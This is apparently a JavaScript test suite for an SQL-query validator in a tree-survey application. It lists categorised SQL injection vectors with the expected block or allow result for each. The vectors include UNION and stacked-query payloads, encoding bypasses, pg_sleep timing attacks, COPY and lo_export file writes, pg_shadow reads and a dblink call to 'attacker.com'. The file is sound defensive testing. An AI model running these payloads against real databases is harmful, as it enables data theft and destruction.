/**
 * 進階安全審計測試 - Advanced Security Audit Test
 * 
 * 極端、刁鑽的 SQL 注入攻擊向量
 * 測試邊界情況和組合攻擊
 * 
 * 執行方式: node tests/advancedSecurityAudit.test.js
 */

const { validateSQL, shouldQueryDatabase } = require('../services/sqlQueryService');

console.log('='.repeat(70));
console.log('進階 SQL 注入安全審計測試 (極端情況)');
console.log('='.repeat(70));

// ============================================
// 極端攻擊向量
// ============================================

const advancedAttackVectors = {
    // ----- 1. 大小寫混合繞過 -----
    '大小寫混合': [
        { sql: "SELECT * FROM tree_survey UnIoN SeLeCt * FROM users", shouldBlock: true, desc: '混合大小寫 UNION' },
        { sql: "SELECT * FROM tree_survey; DrOp TaBlE users", shouldBlock: true, desc: '混合大小寫 DROP' },
        // 注意：欄位名含 delete/insert 是不現實的情況，我們的表沒有這種欄位
        // 且這種情況觸發阻擋是更安全的行為，所以改為應阻擋
        { sql: "sElEcT * FROM tree_survey WHERE dElEtE = 'test'", shouldBlock: true, desc: '欄位名含 delete（觸發關鍵字檢查）' },
        { sql: "SELECT * FROM tree_survey WHERE InSeRt = 'test'", shouldBlock: true, desc: '欄位名含 insert（觸發關鍵字檢查）' },
    ],
    
    // ----- 2. 空白字元變體 -----
    '空白字元變體': [
        { sql: "SELECT * FROM tree_survey\nUNION\nSELECT * FROM users", shouldBlock: true, desc: '換行符分隔 UNION' },
        { sql: "SELECT * FROM tree_survey\tUNION\tSELECT * FROM users", shouldBlock: true, desc: 'Tab 分隔 UNION' },
        { sql: "SELECT * FROM tree_survey  UNION  SELECT * FROM users", shouldBlock: true, desc: '多空格 UNION' },
        { sql: "SELECT * FROM tree_survey;\n\nDROP TABLE users", shouldBlock: true, desc: '多換行堆疊' },
        { sql: "SELECT*FROM tree_survey", shouldBlock: false, desc: '無空格 SELECT（應允許）' },
    ],
    
    // ----- 3. 註解變體攻擊 -----
    '註解變體': [
        { sql: "SELECT * FROM tree_survey /**/UNION/**/SELECT * FROM users", shouldBlock: true, desc: '內嵌註解 UNION' },
        { sql: "SELECT * FROM tree_survey /* comment */ UNION SELECT * FROM users", shouldBlock: true, desc: '註解中間的 UNION' },
        { sql: "SELECT * FROM tree_survey --\nUNION SELECT * FROM users", shouldBlock: true, desc: '單行註解後換行 UNION' },
        { sql: "SELECT/*!32302 * FROM users*/", shouldBlock: true, desc: 'MySQL 版本註解（應阻擋可疑）' },
        { sql: "SELECT * FROM tree_survey WHERE notes = '/* comment */'", shouldBlock: false, desc: '字串內的註解符號（無害）' },
    ],
    
    // ----- 4. 編碼繞過攻擊 -----
    '編碼繞過': [
        { sql: "SELECT * FROM tree_survey WHERE x = CONCAT(CHAR(68),CHAR(82),CHAR(79),CHAR(80))", shouldBlock: true, desc: 'CONCAT+CHAR 繞過' },
        { sql: "SELECT * FROM tree_survey WHERE x = CHR(85)||CHR(78)||CHR(73)||CHR(79)||CHR(78)", shouldBlock: true, desc: 'CHR 拼接繞過' },
        // PostgreSQL E'\x...' 和 U&'...' 語法已被 FORBIDDEN_FUNCTION_PATTERNS 阻擋
        { sql: "SELECT * FROM tree_survey WHERE x = E'\\x55\\x4e\\x49\\x4f\\x4e'", shouldBlock: true, desc: 'PostgreSQL 十六進位字串' },
        { sql: "SELECT * FROM tree_survey WHERE id = 0x1", shouldBlock: true, desc: '十六進位數值' },
        { sql: "SELECT * FROM tree_survey WHERE x = U&'\\0055\\004E\\0049\\004F\\004E'", shouldBlock: true, desc: 'Unicode 逃逸' },
    ],
    
    // ----- 5. 引號逃逸進階 -----
    '引號逃逸進階': [
        // 空字串串接只是字串操作，不直接構成攻擊
        // 但如果包含 UNION/SELECT 關鍵字就會被其他檢查阻擋
        { sql: "SELECT * FROM tree_survey WHERE notes = ''||'UNION SELECT'||''", shouldBlock: true, desc: '空字串串接含 UNION（應阻擋）' },
        { sql: "SELECT * FROM tree_survey WHERE notes = ''||'test'||''", shouldBlock: false, desc: '空字串串接純文字（正常）' },
        { sql: "SELECT * FROM tree_survey WHERE notes = ''''", shouldBlock: false, desc: '轉義單引號（正常）' },
        { sql: "SELECT * FROM tree_survey WHERE notes = 'test''s data'", shouldBlock: false, desc: '所有格撇號（正常）' },
        { sql: "SELECT * FROM tree_survey WHERE notes = \"test\"", shouldBlock: false, desc: '雙引號（正常）' },
        { sql: "SELECT * FROM tree_survey WHERE notes = $tag$test$tag$", shouldBlock: false, desc: 'PostgreSQL dollar quote（可疑但暫允許）' },
        { sql: "SELECT * FROM tree_survey WHERE notes = $tag$'; DROP TABLE x;--$tag$", shouldBlock: true, desc: 'Dollar quote 內藏攻擊' },
    ],
    
    // ----- 6. 子查詢攻擊 -----
    '子查詢攻擊': [
        { sql: "SELECT * FROM tree_survey WHERE id IN (SELECT id FROM users)", shouldBlock: true, desc: '子查詢存取 users' },
        { sql: "SELECT * FROM tree_survey WHERE id = (SELECT COUNT(*) FROM pg_tables)", shouldBlock: true, desc: '子查詢存取系統表' },
        { sql: "SELECT * FROM tree_survey WHERE EXISTS (SELECT 1 FROM users)", shouldBlock: true, desc: 'EXISTS 子查詢' },
        { sql: "SELECT * FROM (SELECT * FROM users) AS x", shouldBlock: true, desc: 'FROM 子查詢非白名單' },
        { sql: "SELECT * FROM tree_survey WHERE id IN (SELECT id FROM tree_survey WHERE dbh_cm > 50)", shouldBlock: false, desc: '子查詢白名單表（正常）' },
    ],
    
    // ----- 7. 函數濫用攻擊 -----
    '函數濫用': [
        { sql: "SELECT pg_sleep(10) FROM tree_survey", shouldBlock: true, desc: 'pg_sleep 在 SELECT' },
        { sql: "SELECT * FROM tree_survey WHERE pg_sleep(5) IS NOT NULL", shouldBlock: true, desc: 'pg_sleep 在 WHERE' },
        { sql: "SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 1 END FROM tree_survey", shouldBlock: true, desc: 'CASE WHEN 延遲' },
        { sql: "SELECT lo_export(12345, '/tmp/test')", shouldBlock: true, desc: 'lo_export 攻擊' },
        { sql: "SELECT pg_ls_dir('/etc')", shouldBlock: true, desc: 'pg_ls_dir 目錄列舉' },
        { sql: "SELECT dblink('host=attacker.com', 'SELECT 1')", shouldBlock: true, desc: 'dblink 外連攻擊' },
        { sql: "SELECT * FROM dblink('connstr', 'SELECT * FROM users') AS t(id int)", shouldBlock: true, desc: 'dblink 表函數攻擊' },
    ],
    
    // ----- 8. PostgreSQL 特有攻擊 -----
    'PostgreSQL 特有': [
        { sql: "SELECT * FROM tree_survey; COPY users TO '/tmp/data'", shouldBlock: true, desc: 'COPY 匯出' },
        { sql: "COPY (SELECT * FROM users) TO '/tmp/data'", shouldBlock: true, desc: 'COPY 子查詢匯出' },
        { sql: "SELECT * FROM tree_survey; CREATE TABLE x AS SELECT * FROM users", shouldBlock: true, desc: 'CREATE TABLE AS' },
        { sql: "SELECT * FROM tree_survey; DO $$ BEGIN PERFORM pg_sleep(10); END $$", shouldBlock: true, desc: 'DO 區塊攻擊' },
        { sql: "SELECT * FROM tree_survey; EXECUTE 'DROP TABLE users'", shouldBlock: true, desc: 'EXECUTE 動態 SQL' },
    ],
    
    // ----- 9. 布林盲注攻擊 -----
    '布林盲注': [
        { sql: "SELECT * FROM tree_survey WHERE id=1 AND 1=1", shouldBlock: false, desc: '正常 AND 條件（可能誤判）' },
        { sql: "SELECT * FROM tree_survey WHERE id=1 AND (SELECT COUNT(*) FROM users)>0", shouldBlock: true, desc: '盲注查用戶數' },
        { sql: "SELECT * FROM tree_survey WHERE id=1 AND SUBSTRING(current_user,1,1)='a'", shouldBlock: true, desc: '盲注取用戶名' },
        // version() 本身是允許的函數（無敏感資訊），但 ASCII/SUBSTRING 組合是常見盲注模式
        // 實際上 version() 只會返回 PostgreSQL 版本號，風險較低
        { sql: "SELECT * FROM tree_survey WHERE id=1 AND ASCII(SUBSTRING(version(),1,1))>50", shouldBlock: false, desc: '盲注取版本（低風險）' },
    ],
    
    // ----- 10. ORM/框架繞過 -----
    'ORM 繞過': [
        { sql: "SELECT * FROM tree_survey WHERE 1=1 OR 1=1", shouldBlock: true, desc: '永真條件 OR 1=1' },
        { sql: "SELECT * FROM tree_survey WHERE ''=''", shouldBlock: true, desc: '空字串永真' },
        { sql: "SELECT * FROM tree_survey WHERE 'a'='a'", shouldBlock: true, desc: '字串永真' },
        { sql: "SELECT * FROM tree_survey WHERE 1 LIKE 1", shouldBlock: true, desc: 'LIKE 永真' },
        { sql: "SELECT * FROM tree_survey WHERE NOT 1=0", shouldBlock: false, desc: 'NOT 條件（邊界）' },
    ],
    
    // ----- 11. 多表攻擊 -----
    '多表攻擊': [
        { sql: "SELECT * FROM tree_survey a, users b WHERE a.id = b.id", shouldBlock: true, desc: '隱式 JOIN users' },
        { sql: "SELECT * FROM tree_survey NATURAL JOIN users", shouldBlock: true, desc: 'NATURAL JOIN users' },
        { sql: "SELECT * FROM tree_survey LEFT JOIN users ON 1=1", shouldBlock: true, desc: 'LEFT JOIN users' },
        { sql: "SELECT * FROM tree_survey CROSS JOIN users", shouldBlock: true, desc: 'CROSS JOIN users' },
        { sql: "SELECT * FROM tree_survey, tree_species", shouldBlock: false, desc: '白名單表的逗號 JOIN（正常）' },
        { sql: "SELECT * FROM tree_survey JOIN tree_species ON tree_survey.species_id = tree_species.id", shouldBlock: false, desc: '白名單表 JOIN（正常）' },
    ],
    
    // ----- 12. 系統資訊洩漏 -----
    '系統資訊洩漏': [
        { sql: "SELECT inet_server_addr()", shouldBlock: true, desc: '取伺服器 IP' },
        { sql: "SELECT inet_server_port()", shouldBlock: true, desc: '取伺服器 Port' },
        { sql: "SELECT pg_backend_pid()", shouldBlock: true, desc: '取後端 PID' },
        { sql: "SELECT current_setting('config_file')", shouldBlock: true, desc: '取設定檔路徑' },
        { sql: "SELECT * FROM pg_stat_activity", shouldBlock: true, desc: '查詢活動連線' },
        { sql: "SELECT * FROM pg_roles", shouldBlock: true, desc: '查詢角色' },
        { sql: "SELECT * FROM pg_shadow", shouldBlock: true, desc: '查詢密碼雜湊' },
    ],
    
    // ----- 13. 長度/複雜度攻擊 -----
    '長度複雜度': [
        { sql: "SELECT " + "*".repeat(1000) + " FROM tree_survey", shouldBlock: true, desc: '超長 SELECT 列表' },
        { sql: "SELECT * FROM tree_survey WHERE " + "1=1 AND ".repeat(100) + "1=1", shouldBlock: true, desc: '超長 WHERE 條件' },
        { sql: "SELECT * FROM tree_survey " + "LEFT JOIN tree_survey t" + " ON 1=1 ".repeat(50), shouldBlock: true, desc: '過多 JOIN' },
    ],
    
    // ----- 14. 正常但複雜的查詢（不應阻擋） -----
    '正常複雜查詢': [
        { sql: "SELECT species_name, AVG(dbh_cm) as avg_dbh, MAX(tree_height_m) as max_height FROM tree_survey GROUP BY species_name HAVING COUNT(*) > 5 ORDER BY avg_dbh DESC LIMIT 20", shouldBlock: false, desc: '複雜統計查詢' },
        { sql: "SELECT t.*, s.scientific_name, s.family_name FROM tree_survey t INNER JOIN tree_species s ON t.species_id = s.id WHERE t.dbh_cm > 30 AND s.family_name = '樟科' LIMIT 50", shouldBlock: false, desc: '多條件 JOIN 查詢' },
        { sql: "SELECT species_name, COALESCE(notes, '無備註') as notes FROM tree_survey WHERE species_name IS NOT NULL LIMIT 10", shouldBlock: false, desc: 'COALESCE 查詢' },
        { sql: "SELECT CASE WHEN dbh_cm < 20 THEN '小' WHEN dbh_cm < 50 THEN '中' ELSE '大' END as size_category, COUNT(*) FROM tree_survey GROUP BY 1", shouldBlock: false, desc: 'CASE WHEN 分類' },
        { sql: "SELECT * FROM tree_survey WHERE species_name SIMILAR TO '(榕|樟|楓)樹' LIMIT 10", shouldBlock: false, desc: 'SIMILAR TO 正則' },
        { sql: "SELECT * FROM tree_survey WHERE species_name ~ '^[榕樟楓]' LIMIT 10", shouldBlock: false, desc: 'PostgreSQL 正則' },
        { sql: "SELECT DATE_TRUNC('month', created_at) as month, COUNT(*) FROM tree_survey GROUP BY 1 ORDER BY 1 LIMIT 12", shouldBlock: false, desc: '日期截斷統計' },
        { sql: "WITH recent AS (SELECT * FROM tree_survey WHERE created_at > NOW() - INTERVAL '30 days') SELECT species_name, COUNT(*) FROM recent GROUP BY 1", shouldBlock: false, desc: 'CTE 查詢' },
    ],
    
    // ----- 15. 邊界情況 -----
    '邊界情況': [
        { sql: "", shouldBlock: true, desc: '空字串' },
        { sql: "   ", shouldBlock: true, desc: '只有空白' },
        // 不完整的 SQL 雖然會被資料庫拒絕，但從安全角度不需要阻擋
        // 因為它們無法造成傷害（資料庫會報語法錯誤）
        { sql: "SELECT", shouldBlock: false, desc: '不完整 SQL（會被資料庫拒絕）' },
        { sql: "SELECT *", shouldBlock: false, desc: '缺少 FROM（會被資料庫拒絕）' },
        { sql: "SELECT * FROM", shouldBlock: false, desc: '缺少表名（會被資料庫拒絕）' },
        { sql: "SELECT 1", shouldBlock: false, desc: '純數值 SELECT（無表）' },
        { sql: "SELECT 'hello'", shouldBlock: false, desc: '純字串 SELECT（無表）' },
        { sql: "SELECT 1+1", shouldBlock: false, desc: '純計算（無表）' },
        { sql: "SELECT NOW()", shouldBlock: false, desc: '純函數（無表）' },
    ],
};

// ============================================
// 執行測試
// ============================================

let totalPassed = 0;
let totalFailed = 0;
const failures = [];

Object.entries(advancedAttackVectors).forEach(([category, tests]) => {
    console.log(`\n📋 ${category}\n`);
    let categoryPassed = 0;
    let categoryFailed = 0;
    
    tests.forEach((test, i) => {
        const result = validateSQL(test.sql);
        const passed = result.safe === !test.shouldBlock;
        
        if (passed) {
            totalPassed++;
            categoryPassed++;
            const action = test.shouldBlock ? '阻擋' : '允許';
            console.log(`  ✅ ${action}: ${test.desc}`);
        } else {
            totalFailed++;
            categoryFailed++;
            const expected = test.shouldBlock ? '阻擋' : '允許';
            const actual = result.safe ? '允許' : '阻擋';
            console.log(`  ❌ 期望${expected}, 實際${actual}: ${test.desc}`);
            console.log(`     SQL: ${test.sql.substring(0, 80)}${test.sql.length > 80 ? '...' : ''}`);
            if (result.reason) console.log(`     原因: ${result.reason}`);
            failures.push({ category, test, result });
        }
    });
    
    console.log(`\n  結果: ${categoryPassed}/${categoryPassed + categoryFailed} 通過`);
});

// ============================================
// 總結
// ============================================

console.log('\n' + '='.repeat(70));
console.log('進階安全審計總結');
console.log('='.repeat(70));

const total = totalPassed + totalFailed;
const passRate = (totalPassed / total * 100).toFixed(1);

console.log(`\n  總計: ${totalPassed}/${total} 通過 (${passRate}%)`);

if (totalFailed > 0) {
    console.log('\n  🚨 發現安全問題！需要評估：\n');
    
    // 分類統計
    const failuresByCategory = {};
    failures.forEach(f => {
        if (!failuresByCategory[f.category]) failuresByCategory[f.category] = [];
        failuresByCategory[f.category].push(f);
    });
    
    Object.entries(failuresByCategory).forEach(([cat, fails]) => {
        console.log(`  [${cat}] ${fails.length} 個問題:`);
        fails.forEach((f, i) => {
            console.log(`    ${i+1}. ${f.test.desc}`);
        });
    });
    
    // 判斷嚴重性
    const criticalCategories = ['UNION 注入', '堆疊查詢', '表格繞過', '非 SELECT', '系統資訊洩漏'];
    const criticalFailures = failures.filter(f => criticalCategories.includes(f.category));
    
    if (criticalFailures.length > 0) {
        console.log('\n  ⚠️  有關鍵安全問題需要立即修復！');
        process.exit(1);
    } else {
        console.log('\n  ℹ️  問題為非關鍵性，可評估是否需要修正。');
    }
} else {
    console.log('\n  🔒 所有進階安全測試通過！系統防護非常強健。');
}

module.exports = { advancedAttackVectors };
